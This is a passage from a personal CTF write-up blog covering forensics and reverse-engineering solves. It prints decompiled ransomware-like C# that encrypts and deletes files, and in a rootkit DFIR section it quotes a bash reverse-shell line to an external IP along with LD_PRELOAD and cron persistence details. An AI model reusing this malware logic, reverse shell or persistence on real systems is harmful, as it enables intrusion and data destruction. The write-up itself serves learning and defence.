---
title: "NCLP CTF — Season 1"
description: "Complete write-ups of challenge that I solved in CTF Competition held by Noctra Lupra Community under ID-Networkers."
pubDate: "Oct 05 2025"
heroImage: "/images/nclp/BANNER.png"
---

Complete write-ups of challenge that I solved in CTF Competition held by Noctra Lupra Community under ID-Networkers. I finished at the top of leaderboard and have received a specialist role for achieving the most solves in Digital Forensics, Reverse Engineering, and OSINT.

![](/images/nclp/score.png)
![](/images/nclp/image.png)

## Forensic
### a bit plan

#### Description
I dare you can't find my flag

#### Solution
From the chall title, it references to steganography technique bit plane.

![Stego Image](/images/nclp/a_bit_plan/image.png)

With tools from (https://georgeom.net/StegOnline/upload), we can explore the bit plane of the image.

![Bit Plane Analysis](/images/nclp/a_bit_plan/image-1.png)

Flag found in Blue 0.

#### Flag
NCLPS1{b4g41mAna_mungk1n_k4mu_m3nemuk4n_ku?_ ed137c932e}

### chunking

#### Description
Pada 23–24 Agustus 2025 (WIB), tim security melihat lonjakan ke endpoint internal melewati reverse proxy produksi. Permintaan berasal dari beberapa ASN cloud dan residential. Tidak ada anomali mencolok di status HTTP (umumnya 200/204), tetapi metrik request length meningkat, sementara upstream response time tetap rendah. Dugaan awal adalah beaconing

#### Solution
Starting with opening the log file and found `rb64` field. From the rb64 field, we can collect all of rb64's values with this code.
```python
import sys, json, argparse

def iter_rb64(paths):
    for p in paths:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        o = json.loads(line)
                    except Exception:
                        continue
                    rb64 = o.get("rb64")
                    if rb64:
                        yield rb64
        except Exception as e:
            print(f"[!] Gagal membuka {p}: {e}", file=sys.stderr)

def main():
    path_1 = "23.log"
    path_2 = "23.1.log"
    path_3 = "24.log"
    count_in, count_out = 0, 0
    with open("rb64_all.txt", "w", encoding="utf-8") as out:
        for rb64 in iter_rb64([path_1, path_2, path_3]):
            count_in += 1
            out.write(rb64.rstrip() + "\n")
            count_out += 1

    print(f"Saved: rb64_all.txt")

if __name__ == "__main__":
    main()
```

![alt text](/images/nclp/chunking/image.png)

From the rb64's values, It turns out that the encoding is base64 then gunzip. From the output of some decoded value, the result is just a `junk` and decoy.

![alt text](/images/nclp/chunking/image-1.png)

Upon further analysis, found rb64's length that's suspicious (`H4sIAKGQvWgC/3MLcnSPNjTXNzSPtfWrCsrydQ/KjDQKy/XNM7DlihgmgAsA/HIt5OYAAAA=`), if we decode the result is a fragment [17/17] and base64 chunk.

![alt text](/images/nclp/chunking/image-2.png)

From the fragment, we know that the difference from other payloads is the `x-campaign`. The suspicious payload has `x-campaign = koi-44291a1b`. With that information, we can gather all of the fragments then decode it to retrieve the flag.

I did this with the following code:

```python
import sys, json, argparse
import base64, zlib, re

def iter_rb64_for_campaign(paths, campaign):
    for p in paths:
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        o = json.loads(line)
                    except Exception:
                        continue
                    hdr = o.get("hdr") or {}
                    if hdr.get("x-campaign") != campaign:
                        continue
                    rb64 = o.get("rb64")
                    if rb64:
                        yield rb64
        except Exception as e:
            print(f"[!] Gagal membuka {p}: {e}", file=sys.stderr)

def b64_gunzip_decode(data):
    try:
        decoded = base64.b64decode(data)
        decompressed = zlib.decompress(decoded, wbits=zlib.MAX_WBITS | 16)
        return decompressed.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[!] Error decoding/decompressing data: {e}", file=sys.stderr)
        return None

def main():
    campaign = "koi-44291a1b"
    paths = ["23.log", "23.1.log", "24.log"]
    frags = {}
    patt = re.compile(r"FRAG\[(\d+)/\d+\]=([A-Za-z0-9+/=]+)")

    for rb64 in iter_rb64_for_campaign(paths, campaign):
        decoded = b64_gunzip_decode(rb64)
        if not decoded:
            continue
        for i, b64part in patt.findall(decoded):
            frags[int(i)] = b64part
    
    joined_b64 = ''.join(frags[i] for i in sorted(frags))
    try:
        print(base64.b64decode(joined_b64).decode('utf-8'))
    except Exception as e:
        print(f"[!] Gagal base64-decode gabungan: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
```

#### Flag
NCLPS1{gz_m3rup4kAn_mUlt1m3mBer_bUk4n_P3r_cHunK_74c0dbcef2}

### Evaporated 

#### Description
Someone is hiding something there, but I don't know what they are hiding

#### Solution
![](/images/nclp/evaporated/image.png)

We are given evidence file named `evaporated.001`. With autopsy, we know that there is deleted file name `logo noctra lupra.png`.

![](/images/nclp/evaporated/image-1.png)

When opening the PNG file, it seems corrupt. From then, I analyzed it with hexeditor to check the hex signature of this file. A valid PNG file always starts with 8 bytes signature containing `89 50 4E 47 0D 0A 1A 0A`. But, in this file, it doesn't start like that, so I fixed it.

![](/images/nclp/evaporated/image-2.png)
![](/images/nclp/evaporated/fix.png)

After recovering the PNG, I checked the typical steganography techniques. But it doesn't return anything valuable. 
I have an assumption that there is a mismatch on the size (width x height) of this PNG.

![](/images/nclp/evaporated/image-3.png)

In PNG file, width and height are saved in **IHDR** chunk. So, I changed the value of the **height** so the viewer can render it.

![](/images/nclp/evaporated/image-4.png)

After I changed it, the flag appears in the bottom of the file.

#### Flag
NCLPS1{t4k_kus4ngkA_t3rny4Ta_fl4gny4_b3rsembuny1_09217b9c25}

### Forgotten Fragments 

#### Description
Forgotten fragments of the screen still linger in the client's memory.

#### Solution
```bash
xxd -g 1 -l 64 Cache0000.bin
```

I identified the given file with hexdump and it turns out that the first byte structure is RDP cache.

![alt text](/images/nclp/forgotten_frag/image.png)

To extract it, I use [bmc-tools](https://github.com/ANSSI-FR/bmc-tools).

```bash
python3 bmc-tools.py -s Cache0000.bin -b -d ./out
```

![alt text](/images/nclp/forgotten_frag/image-1.png)

After that, in /out we can see the result and the collage named **`_collage.bmp`**. Zoom in on the clearest tiles to get the flag.

#### Flag
NCLPS1{in1_ng4p4in_bAngG,_bElaJar_Ya_b4ng?_9c84ea66ff}

### From Outer Space 

#### Description
Sinyal misterius

#### Solution
![alt text](/images/nclp/outer_space/image-1.png)

I checked what the given file actually is and it turns out that's a RIFF audio file.

![alt text](/images/nclp/outer_space/image.png)

One of the typical audio steganography techniques is using SSTV, so I tried to decode it with [SSTV Decoder](https://sstv-decoder.mathieurenaud.fr/) and I could retrieve the flag.

#### Flag
NCLPS1{m44f_ya_b3r1sik_t3lin94_am4n_kan?}

### Incident Trace 

#### Description
Sebuah mesin memperlihatkan aktivitas tak biasa, diduga terinfeksi binary berbahaya. Timmu berhasil memperoleh memory dump dari mesin tersebut. Periksa lebih dalam untuk menemukan artefak penting yang tersembunyi ataupun mencurigakan.

Note: Flag has 2 parts

#### Solution
We're given `*.lime` file (Linux memory extractor). For the further analysis, I'm using volatility 3 to extract the dump of process and memory.

![alt text](/images/nclp/incident_trace/image.png)
![alt text](/images/nclp/incident_trace/image-1.png)

```bash
vol -f incident_trace.lime linux.psaux.PsAux
```

From the output of the command, I found two suspicious process, flagd (pid 1056) and c2_beacon (pid 597).

```yara
rule flag {
  strings:
    $a = /NCLPS1\{[^\}]{0,256}/ ascii wide
  condition:
    $a
}
```

I made a yara file and set the rule to do flag scanning with flag format, so i can retrieve the flag more easily.

```bash
vol -f incident_trace.lime linux.vmayarascan.VmaYaraScan --pid "1056" --yara-file flag.yar
vol -f incident_trace.lime linux.vmayarascan.VmaYaraScan --pid "597" --yara-file flag.yar
```

With plugin linux.vmayarascan.VmaYaraScan and yara rule, I targeted the suspicious processes before.

![alt text](/images/nclp/incident_trace/image-2.png)

From the result, I got the partA of the flag in pid 1056, but the pid 597 doesn't returns anything.

```yara
rule all_strings {
  strings:
    $s = /[ -~]{6,}/ ascii wide
  condition:
    $s
}
```
```bash
vol -f incident_trace.lime linux.vmayarascan.VmaYaraScan --pid "597" --yara-file flag.yar
```

Further scanning, I dump all of strings from pid 597 with yara rule.

![alt text](/images/nclp/incident_trace/image-3.png)

PartB found in the response body of the c2, assamble it to get the correct flag.

#### Flag
NCLPS1{w00owWwW_k4mu_men3muK4n_fLa9_d1_h34p_seLanjuTNy4_d1_n3TwoRk_vla_C2_buff3r_2fafe5711d}

### Layers 

#### Description
Sebuah layanan internal (web static di reverse Nginx dengan backend di /api) sempat dibuild dan didistribusikan. Setelah itu, salah satu developer mengakui pernah memasukkan sebuah berkas teks berisi token internal ke dalam layanan tersebut, lalu diubah isinya beberapa waktu kemudian, dan akhirnya dihapus pada build berikutnya. Untuk keperluan audit & rotasi kredensial, tim diminta memastikan apakah artefak token itu masih tersisa, dan bila masih ada mengambil nilai token tersebut.

#### Solution
Given `layers.tar` and after extracting the file, it turns out that's an OCI image layout. First step is to convert the OCI-Layout to docker-archive so I can do the analysis more easily.

```bash
skopeo copy oci-archive:layers.tar docker-archive:layers-docker.tar:nclp/layers:latest
```
`skopeo copy` helps for turning OCI layout to docker-archive that can support `dive` and I can do the inspection of the metadata image (manifest/config) without running the container. After that, I opened the `docker-archive` with `dive` to see the registered layer, command history, and the content of layer interactively.

```bash
dive docker-archive://layers-docker.tar
```

![alt text](/images/nclp/layers/image.png)

With `dive`, I analyzed layers that contain some suspicious instructions. There is a `COPY flag.txt /root/flag.txt` instruction. Upon analyzing this, I can get the layer ID `da43bac397f47302e4e2ad61c7ab22da577ef41d77c194a8fab68a2e6cb42499` of the instruction. The next step is to extract the tar file based on the layer ID, then read the flag.txt.

```bash
tar xvf layers-docker.tar
```

![alt text](/images/nclp/layers/image-1.png)

**Reference** https://05t3.github.io/posts/Urchinsec-CTF/

#### Flag
NCLPS1{d33p_l4yer5_pRes3rVe_t1meLinE_M0re_th4n_y0u_th1nk_822644845a}

### Redaction Fail 

#### Description
Divisi compliance menyerahkan sebuah dokumen final yang telah dirilis ke pihak eksternal. Dokumen tersebut memuat blok hitam menutupi sebuah informasi sensitif. Ada dugaan bahwa proses "redaksi" tidak dilakukan dengan benar.

#### Solution
I started with opening the PDF file and seeing the parts that got censored. But most of all, it's just a decoy. The next step is to analyze the PDF structures with strings.

![alt text](/images/nclp/redaction/image.png)

I found suspicious things at the 7th object. That object contains properties with `ASCII85Decode`, `FlateDecode` and some random encoding. This indicates that the data got encoded with ASCII85 then compressed with zlib/deflate. I decoded the data with this script:

```python
import base64
import zlib

data = r'''GatU0gMY_1&:N^lk,CtI5eOh#2k$OWPa!<Cp*l.^_$b)G?)(t*8uqr<a5@Xj%;hgHamt.,R56YB^nDk)?De.g4bp?S%%%EM#0cQ3^i/.oGC#)No8\RHL"MH4ELau*#7S6VN.BSQa.^gT@"/OoHZ9.bpT2c!#p0@54BHJYi\7H7W%Anj/ok55j]ii/IfOrG?sbb_N71SrSASPpJ?'j.*"N9502OZ5.ec`5\i@01DHNpeoP:J0laXd!P;mR6@D>`)J_fB)R\QJ#Z06fR_aH&X;"qgl:%U2,Xj5Q?IpLu)c=B[Ont<*=)@PcG(`2fO>9jpTA()C;gCYh>>]9XE^uR@E&jm@'m/S^*V+3iY,P)YEL+bl+V)_XK'X@ZF+pqL>Ib)s@iEB4!6dkGE#i0$%j"T>*c,5?B05CHje8pM2335EZ_L*Y<]e'AQ7[?MI>X:iO+#&&;JsYO42`-r6G?Du[g.Ig@'\7/g=<Lki[3Um'P=l(3.[0R-TRS,->"uN$rZD&NR'_HWGK3Ef?pe'_-<J&b&!_f?gFB+Ib`mKXEq>aJ_PkufQag`OA3C3@3C`'r;k?encni(oVA1\Mh0>O.!qca:AbjZ8_]X65GVF"\BQ+qMEL?(f5o9WoBp_FA@A'id#^8eVo:+-\ICE[e2nm7Q<qu8CA#]"LCa'mjIe1Qj.Ygs_I1huYO]J5.6S;9uBst*@<MQ'8o2spq_Y\=sI+Y@SlM!;M8SRnWU<G,61t=%kapdm=mS)KtS5r`Z/mq7LQpX`El+QJ7,?Ze1<W#r;73UimjCsO*4WOOHX`rZ>mU![%N:$BF7`*5C;$u3*E[K`tP(aT+\GRhRQ'H+c\$MKmMY9UBSY&f5[0Z~>'''

decoded_a85 = base64.a85decode(data, adobe=True)

try:
    result = zlib.decompress(decoded_a85)
except zlib.error:
    result = zlib.decompress(decoded_a85, -15)

print(result.decode("utf-8", errors="replace"))
```

#### Flag
NCLPS1{teRny4ta_fl4g_d1_r3v1Si0n_z3Ro_iNcr3MenTal_uPddaTe_m3n1pu_m4ta_0dd31503e3}

### Reward Runner 

#### Description
Rani baru saja mendapatkan email aneh. Pada email tersebut Rani diberikan file "rewardrunner.exe". Saat dijalankan Rani kehilangan pesan penting-nya. Tolong Rani membalikkan pesan penting tersebut.

#### Solution
![alt text](/images/nclp/reward_runner/image.png)
![alt text](/images/nclp/reward_runner/image-1.png)

Firstly, I opened the email and checked the message. In the email there is a base64 string, so I decoded it and it turns out that's a zip file.

![alt text](/images/nclp/reward_runner/image-2.png)

I tried to extract the file, but it needs a password. In the email, there is a pastebin link that refers to *known plaintext attack*.

![alt text](/images/nclp/reward_runner/image-3.png)

Viewing with file explorer, I see a `.git` directory included with `HEAD` file in it. This can be a source to do the known plaintext attack for the encrypted zip file since the `HEAD` file is predictable.

```bash
bkcrack -C out.zip -c ".git/HEAD" -p HEAD
```

I'm using `bkcrack` to do the attack with the command above. The command tells `bkcrack` to get the ciphertext from `rewardrunner.zip` and point it to a suitable known file to retrieve the key of the zip file.

![alt text](/images/nclp/reward_runner/image-4.png)

`bkcrack` then counts the encryption key for all of the archive and we can extract the files in it with the key.

![alt text](/images/nclp/reward_runner/image-5.png)

Next step, with the found key, we can decrypt the zip file with command above and the output is `rewardrunner.exe`.

![alt text](/images/nclp/reward_runner/image-6.png)

Upon analysis to the `rewardrunner.exe` it seems this is a compiled file from .NET. I then decompiled it with [ILSpy](https://github.com/icsharpcode/ILSpy) to seek the encryption algorithm and the main code.

```csharp
// rewardrunner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// RewardRunner.Program
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Program
{
	private static readonly byte[] AesKey = Encoding.UTF8.GetBytes("id-networkersnlc");

	private static readonly byte[] XorKey = Encoding.UTF8.GetBytes("notcra_lupra");

	private static byte[] xorstep(byte[] data, byte[] xorKey)
	{
		byte[] array = new byte[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			array[i] = (byte)(data[i] ^ xorKey[i % xorKey.Length]);
		}
		return array;
	}

	private static void Main(string[] args)
	{
		string currentDirectory = Directory.GetCurrentDirectory();
		string[] files = Directory.GetFiles(currentDirectory);
		string[] array = new string[5] { ".exe", ".dll", ".pdb", ".idn.enc", "LICENSE" };
		Console.WriteLine("Encrypting files in: " + currentDirectory);
		string[] array2 = files;
		foreach (string text in array2)
		{
			string fileName = Path.GetFileName(text);
			bool flag = false;
			string[] array3 = array;
			foreach (string value in array3)
			{
				if (fileName.EndsWith(value, StringComparison.OrdinalIgnoreCase))
				{
					flag = true;
					break;
				}
			}
			if (flag)
			{
				Console.WriteLine("Skipping: " + fileName);
				continue;
			}
			try
			{
				byte[] data = File.ReadAllBytes(text);
				Console.WriteLine("Encrypting: " + fileName);
				byte[] array4 = xorstep(data, XorKey);
				using (Aes aes = Aes.Create())
				{
					aes.Key = AesKey;
					aes.Mode = CipherMode.CBC;
					aes.Padding = PaddingMode.PKCS7;
					aes.GenerateIV();
					byte[] iV = aes.IV;
					using ICryptoTransform cryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV);
					byte[] array5 = cryptoTransform.TransformFinalBlock(array4, 0, array4.Length);
					byte[] array6 = new byte[iV.Length + array5.Length];
					Buffer.BlockCopy(iV, 0, array6, 0, iV.Length);
					Buffer.BlockCopy(array5, 0, array6, iV.Length, array5.Length);
					File.WriteAllBytes(text + ".idn.enc", array6);
				}
				File.Delete(text);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error encrypting " + fileName + ": " + ex.Message);
			}
		}
		Console.WriteLine("Encryption complete.");
	}
}
```

The main function tells a clear algorithm, file got XOR-ed with `notcra_lupra` key then encrypted with AES-CBC using `id-networkersnlc` key and random IV.

For the decryption we can reverse this with: reads IV, AES-CBC decrypt, remove PKCS#7 padding, then XOR with the XOR key. I do it with this script:

```python
from Crypto.Cipher import AES

key = b"id-networkersnlc"
xor_key = b"notcra_lupra"

data = open("secret.txt.idn.enc","rb").read()
iv, ct = data[:16], data[16:]

# AES-CBC decrypt
pt_xored = AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)

# PKCS7 unpad
pad = pt_xored[-1]
pt_xored = pt_xored[:-pad]

# reverse XOR
pt = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(pt_xored))

print(pt)
```

Running the script to the `secret.txt.idn.enc` that we extracted earlier we can decrypt it and got the flag.txt file.

![alt text](/images/nclp/reward_runner/image-7.png)

#### Flag
NCLPS1{d0nt_be_l1ke_Rani,_y0OoOu_h4ve_t0_be_aw4r3_of_y0urr_3nv1ronm3nt_eef53df1e1}

### Secret Signal 

#### Description
Fenomena aneh terjadi: sebuah media penyimpanan yang tampaknya memiliki kapasitas tak terbatas. Namun, keajaiban ini hanyalah ilusi—ada sesuatu yang tersembunyi di balik 'glitch' tersebut. Setiap lapisan data seakan menutupi lapisan berikutnya, membuat isi sebenarnya sulit dikenali. Petunjuknya ada pada struktur file yang tidak biasa, seakan ada celah di antara byte yang bisa dimanfaatkan. Bisakah kamu menemukan rahasia yang tersembunyi di balik anomali penyimpanan tak berujung ini?
URL: https://www.youtube.com/watch?v=g8vDg94BA3U

#### Solution
From the chall description, it refers to **Infinite Storage Glitch (ISG)** that exploit media file (video) as a hidden storage. 

```bash
yt-dlp -F https://www.youtube.com/watch?v=g8vDg94BA3U
```
![alt text](/images/nclp/secret_signal/image.png)

Firstly, check the Youtube video resolution format with `yt-dlp` using the command above.

```bash
yt-dlp -f 137 https://www.youtube.com/watch?v=g8vDg94BA3U
```
![alt text](/images/nclp/secret_signal/image-1.png)

From the format list, I found that the video has **1080p** resolution in format ID `137`, then downloaded the video with that resolution.

![alt text](/images/nclp/secret_signal/image-2.png)

Next step is extracting the ISG with tools that available in GitHub: [Infinite\_Storage\_Glitch](https://github.com/KKarmugil/Infinite_Storage_Glitch).

![alt text](/images/nclp/secret_signal/image-3.png)

The output is `reverse.mkv`, I checked it with file command, and it turns out that's a **ZIP file**.

```bash
mv output.mkv secret.zip
unzip secret.zip
```

I extracted that file and from the output there's an image with the flag in it.

![](/images/nclp/secret_signal/3.png)

#### Flag
NCLPS1{k1ta_bisA_menyimPAn_fiLe_t4npa_b4tas_d1_yOutub3_f9c3d7cd98}

### the yuesbi 

#### Description
harusnya kamu sudah tau ini apa? menarik bukan?

#### Solution
![alt text](/images/nclp/the_yuesbi/image.png)

Given a pcap file, and I opened it with Wireshark. Upon analyzing the packets, it seems that this file is enumeration of USB device (GET_DESCRIPTOR, SET_CONFIGURATION) and indicates **HID Keyboard**.

![alt text](/images/nclp/the_yuesbi/image-1.png)

I'm using tools from (https://usb.org/sites/default/files/hut1_5.pdf) to detect all captured packets from the keyboard through HID data and decode it automatically. The output shows the flag.

#### Flag

NCLPS1{t1d4k_H4nYya_n3twOrk_y4ng_4da_traffFf1c_USBb_juug4_ad4_tr4ff1cny4_7938ae8d3c}

### traficc 

#### Description
Aku baru saja kehilangan pesan pentingku. Tampaknya ada sesuatu yang aneh pada jaringanku. Bantu aku mencarinya.

#### Solution
![alt text](/images/nclp/traficc/image.png)

Given two files for this chall, pcapng and .dd. For the first analysis, I did strings command for both of the files then piped it to grep the flag format (`NCLPS1{`), and somehow it gives the flag lol. (I know it's unintended but that's how you recon all artifacts that are given by the chall hehe).

#### Flag
NCLPS1{h0w_yOu_g0t_m3_4re_you_t1r3d_t0_f1nd_m3?_fd4ea173b1}

### Whisper From The Basement 

#### Description
Sebuah komputer berperilaku aneh dan langsung diisolasi dari jaringan. Kamu diberi akses ke klon terkarantina dari mesin tersebut. Akses keluar (egress) ke internet diblokir, jadi segala upaya "call home" akan gagal.

Tugasmu adalah triage DFIR: cari tahu apa yang mengompromikan, bagaimana ia bertahan/bersembunyi, dan pulihkan 2 pesan yang berusaha disamarkan oleh pelaku.

**Hint:** "Hook yang baik sering bersembunyi di tempat yang selalu dibaca loader dinamis. Satu file di /etc bisa membuat direktori 'terlihat normal' padahal tidak."

#### Solution
From the hint, it refers to the path that always touched by dynamic loader, which `/etc/ld.so.preload`. In that file there is a custom library.

**Filesystem & loader.**

```bash
cat /etc/ld.so.preload
# -> /usr/lib/libloadkit.so

# Avoid hook effect
LD_PRELOAD= /bin/ls -al /etc
```

**Command Hijacking**

```bash
head -n 2 /usr/bin/ls /bin/ls /usr/bin/ps /usr/bin/find /usr/bin/strings
#!/bin/bash
/usr/bin/ls.idn "$@" | grep -vE "Nnc1pl04dkit|sshdd|kit-update"
/usr/bin/ps.idn "$@" | grep -vE "sshdd|kit-update"
/usr/bin/find.idn "$@" 2>/dev/null | grep -vE "Nnc1pl04dkit|sshdd|kit-update"
/usr/bin/strings.idn "$@" | grep -vE "NCLPS1"

# using .idn binary to do actual straight analysis
/usr/bin/strings.idn -n 4 /root/quarantine/libloadkit.so | grep -i 'NCLP\|NCLPS1\|idn\|loadkit'
```

**Systemd & cron.**

```bash
systemctl list-unit-files --state=enabled | grep -i nnc1pl
LD_PRELOAD= systemctl cat Nnc1pl04dkit-monitor.service
# ExecStart=/usr/local/bin/Nnc1pl04dkit_monitor.sh

cat /usr/local/bin/Nnc1pl04dkit_monitor.sh
# EXPECTED="/usr/lib/libloadkit.so"; echo ke /etc/ld.so.preload every run

cat /etc/cron.d/kit-update
# * * * * * root /usr/local/bin/Nnc1pl04dkit_monitor.sh
```

**Reverse shell.**

```bash
LD_PRELOAD= systemctl cat sshdd.service
# ExecStart=/usr/local/sbin/sshdd
LD_PRELOAD= journalctl -u sshdd --no-pager | tail -n 40
# bash -i >& /dev/tcp/47.84.89.245/31102 0>&1 (egress blocked)

# key and others indicatord in .rodata
LD_PRELOAD= readelf -p .rodata /root/quarantine/sshdd
# ... "/bin/bash", "n0ctraLUPRa2025", "/dev/tcp/47.84.89.245/31102"
LD_PRELOAD= readelf -p .rodata /root/quarantine/libloadkit.so
# ... "readdir", "Nnc1pl04dkit", "sshdd", "ld.so.preload", "kit-update", "NCLPS1", ".idn"
```

Main compromise is **rootkit based LD_PRELOAD** that hooks `readdir` to hide some files/directories. Double persistence found: **systemd timer** that rewrites `/etc/ld.so.preload` every 30 seconds, and **cron** every minute runs the same recovery preload script. I found a fake service, `sshd.service`, which is a reverse shell to `47.84.89.245:31102`. The solution is cutting the persistence, deactivating preload when doing acquisition, then recovering the two messages.

**Cutting persistence & Deactivate the hook.**

```bash
LD_PRELOAD= systemctl stop Nnc1pl04dkit-monitor.timer sshdd.service
LD_PRELOAD= systemctl disable Nnc1pl04dkit-monitor.timer sshdd.service
LD_PRELOAD= systemctl daemon-reload

# freezing preload & moving the artifacts
mkdir -p /root/quarantine
mv /usr/lib/libloadkit.so /root/quarantine/ 2>/dev/null || true
cp /etc/ld.so.preload /root/quarantine/ld.so.preload.bak 2>/dev/null || true
: > /etc/ld.so.preload
```

**Message #1 (key XOR).**

```bash
LD_PRELOAD= readelf -p .rodata /root/quarantine/sshdd
# "/bin/bash", "n0ctraLUPRa2025", "/dev/tcp/47.84.89.245/31102"
```

**Recovering Message #2 (flag) from the hidden part + ciphertext XOR.**
First part:

```bash
/usr/bin/ls.idn -al /var/.Nnc1pl04dkit
cat /var/.Nnc1pl04dkit/part1.txt
# NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_l
```

Carve ciphertext from `.data` `sshdd`, throw padding NUL in the front, then XOR with the key. Brute-force every possible shift. For the implementation is in this script:

```bash
PART1="/var/.Nnc1pl04dkit/part1.txt"
BIN="/root/quarantine/sshdd"
KEY="n0ctraLUPRa2025"

# test some of offset in .data; 0x3010/0x3020 contains payload
for OFF in 0x3000 0x3010 0x3020 0x3030 0x3040; do
  dd if="$BIN" of=/tmp/ct.enc bs=1 skip=$((OFF)) count=$((0x100)) status=none 2>/dev/null || continue
  perl -0777 -ne 'BEGIN{binmode STDIN; binmode STDOUT} s/^\x00+//; print' /tmp/ct.enc > /tmp/ct.trim

  for S in $(seq 0 $(( ${#KEY} - 1 ))); do
    K="$KEY" S="$S" perl -0777 -ne '
      BEGIN{ binmode STDIN; binmode STDOUT; $k=$ENV{K}; $kl=length $k; $off=int($ENV{S}); }
      $buf=$_; $l=length $buf;
      for (my $i=0; $i<$l; $i++){
        substr($buf,$i,1)=chr( ord(substr($buf,$i,1)) ^ ord(substr($k,($i+$off)%$kl,1)) );
      }
      print $buf;
    ' /tmp/ct.trim > /tmp/ct.dec

    FLAG=$( printf '%s%s' "$(tr -d '\n' < "$PART1")" "$(tr -d '\n' < /tmp/ct.dec)" \
      | LC_ALL=C grep -aoE 'NCLPS1\{[ -~]{0,200}\}' | head -n 1 )

    if [ -n "$FLAG" ]; then
      echo "$FLAG"
      break 2
    fi
  done
done
```

Output successfully HIT at one of offset in **offset `0x3010` shift `0`**:

```
[+] HIT offset=0x3010 shift=0 NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_lFlag part2: 0tt_p3rs1stenc33_725775ce1c}
```

#### Flag
NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_l0tt_p3rs1stenc33_725775ce1c}

## Reverse

### Activator

#### Description
CLI kecil untuk mengaktifkan fitur “Pro” menggunakan license key berformat khusus. Aplikasi menyimpan status aktivasi ke file marker lokal dan menyediakan perintah untuk melihat status saat ini. Dirancang untuk berjalan di Linux/macOS (x86_64) pada mode rilis.

#### Solution

![alt text](/images/nclp/activator/image.png)

From the binary, I decompile it with Ghidra and the flag was hardcoded in the main function.

#### Flag
NCLPS1{aLt1v4si_f1tuR_pr0_d3n9an_apL1k4si_1ni_v1a_l1c3ns3_k3y_3fc84a90b1}

### byte code

#### Description
This code is something another, can you see what the code is todo?

#### Solution
```txt
[101, 154, 101, 21, 26, 170, 80, 171, 76, 19, 44, 233, 88, 234, 118, 32, 39, 252, 26, 183, 76, 32, 97, 53, 81, 88, 99, 85, 50, 125, 74, 76, 87, 94, 33, 121, 124, 86, 48, 63, 48, 68, 85, 49, 108, 122, 52, 87, 53, 82, 35]
```

output.txt contains **list of Python Integer**. The last part is ASCII character that looks like Base85, meanwhile the first part looks like binary.

chall.dism shows bytecode Python 3.11 (from opcode like `RESUME`, `BINARY_SLICE`, `WITH_EXCEPT_START`, etc). This piece of the function is the key :

- **Flag read**: open `flag.txt`, then `read().strip()`.
- **Flag split**: `mid = len(flag)//2` and return `(flag[:mid], flag[mid:])`.
- **byte shift function**:
  - `left(char, amount) => chr((ord(char) - amount) % 256)`
  - `r_t(char, amount) => chr((ord(char) + amount) % 256)`
- **Transform A (XOR)**: generator `''.join(chr(ord(a) ^ b) for (a,b) in zip(s1, repeated_key))` with **short repeated key** that create from tuple constant `(43, 217, 41, 69, 73, 155)`.
- **Transform B (Shift → Base85)**: for `enumerate(s)` the pattern is, even index `left(c, 2)` (−2), odd index `r_t(c, 3)` (+3), the result got **UTF‑8‑ed (`.encode()`)** and **Base85** (`b85encode`), then `.decode()` again to the text.
- **Writer**: set `qw(aer, ot()) + cd(abu)` then write `str([ord(c) for c in ...])` to the `output.txt`. From the calling: `qw` get **2 argument** (suit for XOR+key), `cd` get **1 argument** (suit for Shift→Base85). This means **first phase** processed by XOR, **second phase** processed by Shift→Base85.

Below is solver script from integer list. Script will:
1. Change integer list to string,
2. Search the limit what is the valid suffix for **Base85**, and after UTF-8-ed and get reversed ends with `}` (flag format),
3. Reversed XOR with the recursive key,
4. Combine the both phase.

```python
import base64
from typing import Optional

INTS = [
    101, 154, 101, 21, 26, 170, 80, 171, 76, 19, 44, 233, 88, 234, 118, 32,
    39, 252, 26, 183, 76, 32, 97, 53, 81, 88, 99, 85, 50, 125, 74, 76, 87, 94,
    33, 121, 124, 86, 48, 63, 48, 68, 85, 49, 108, 122, 52, 87, 53, 82, 35,
]

KEY = [43, 217, 41, 69, 73, 155]

s = ''.join(map(chr, INTS))

def try_decode_halfB(base85_text: str) -> Optional[str]:
    try:
        raw = base64.b85decode(base85_text)
        shifted = raw.decode('utf-8')
        out = []
        for i, ch in enumerate(shifted):
            c = ord(ch)
            out.append(chr((c + 2) % 256) if i % 2 == 0 else chr((c - 3) % 256))
        candidate = ''.join(out)
        return candidate
    except Exception:
        return None

best_split = None
halfB_plain = None
for i in range(1, len(s)):
    suf = s[i:]
    rec = try_decode_halfB(suf)
    if not rec:
        continue
    if rec.endswith('}') and all(0 <= ord(c) <= 255 for c in rec):
        best_split = i
        halfB_plain = rec
        break

if best_split is None:
    raise SystemExit('Split Base85 tidak ditemukan — periksa input.')

pref = s[:best_split].encode('latin-1', 'ignore')
plainA = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(pref)]).decode('latin-1')

flag = plainA + halfB_plain
print(flag)
```

#### Flag
NCLPS1{reVers3_eng1neer1ng_python_byte_c0de}

### Endpoint Diagnostic

#### Description
Perusahaan sedang menjalani audit operasional dan kepatuhan. Dalam rangka verifikasi alur onboarding endpoint, tim GRC meminta Infra menjalankan sebuah utilitas diagnostik (diag) di beberapa host untuk memastikan bootstrap handshake ke layanan audit berjalan benar.

Sebagai engineer yang ditugaskan untuk health-check integrasi, Anda perlu membuktikan bahwa token tersebut benar-benar terbentuk saat proses berjalan

#### Solution
![alt text](/images/nclp/endpoint_diag/image.png)

Decompiler shows only two functions `int main(void)` and `void* eraser(void*)`. ChaCha20 looks very clear with state constant: `0x61707865`, `0x3320646e`, `0x79622d32`, `0x6b206574` ("expand 32-byte k") and rotate pattern **16, 12, 8, 7** on the round.

```c
int main(void)

{
  byte bVar1;
  uint32_t uVar2;
  int iVar3;
  size_t sVar4;
  size_t __len;
  void *__addr;
